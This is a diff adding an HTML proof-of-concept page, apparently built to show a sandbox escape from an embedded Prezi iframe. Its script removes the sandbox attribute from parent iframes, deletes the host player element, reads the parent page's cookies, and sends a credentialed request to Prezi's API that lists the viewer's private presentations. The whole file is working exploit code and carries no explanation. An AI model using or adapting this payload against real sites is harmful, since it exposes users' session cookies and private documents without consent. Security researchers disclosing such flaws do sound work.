@@ -1,0 +1,46 @@
+<button onclick="removeSandboxFromIframes();">Escape</button>
+<button onclick="parent.document.getElementById('prezi-player').remove()">Destruct</button>
+<button onclick="printCookies();">Cookies</button>
+<button onclick="alert('escaped');">Alert</button>
+<button onclick="doFetch()">List my private prezis</button>
+<ul id="result"></ul>
+<script>
+    function removeSandboxFromIframes() {
+      const iframes = parent.document.getElementsByTagName("iframe");
+      for (let i = 0; i < iframes.length; i++) {
+        iframes[i].removeAttribute("sandbox");
+      }
+    }
+	function printCookies() {
+	  var x = parent.document.cookie;
+	  document.getElementById("cookies").innerHTML = x;
+	}
+    function doFetch() {
+        const ul = document.getElementById("result");
+        while (ul.firstChild) {
+            ul.removeChild(ul.firstChild);
+        }
+        fetch("https://prezi.com/api/v4/presentation/?mine%2Bshared=true&ordering=-modified_at&offset=0&limit=20&privacy=private", {
+            "headers": {
+                "accept": "application/json",
+                "cache-control": "no-cache",
+                "content-type": "application/json",
+                "pragma": "no-cache",
+                "sec-fetch-dest": "empty",
+                "sec-fetch-mode": "cors",
+                "sec-fetch-site": "same-origin"
+            },
+            "referrer": "https://prezi.com/dashboard/next/",
+            "referrerPolicy": "strict-origin-when-cross-origin",
+            "method": "GET",
+            "mode": "cors",
+            "credentials": "include"
+        }).then(response => {
+            const resp = response.json();
+            const titles = resp.then(data => data.map(item => ul.appendChild(document.createElement("li")).appendChild(document.createTextNode(item.title))));
+        })
+            .catch(error => {
+                ul.innerHTML = error;
+            });
+    }
+</script>
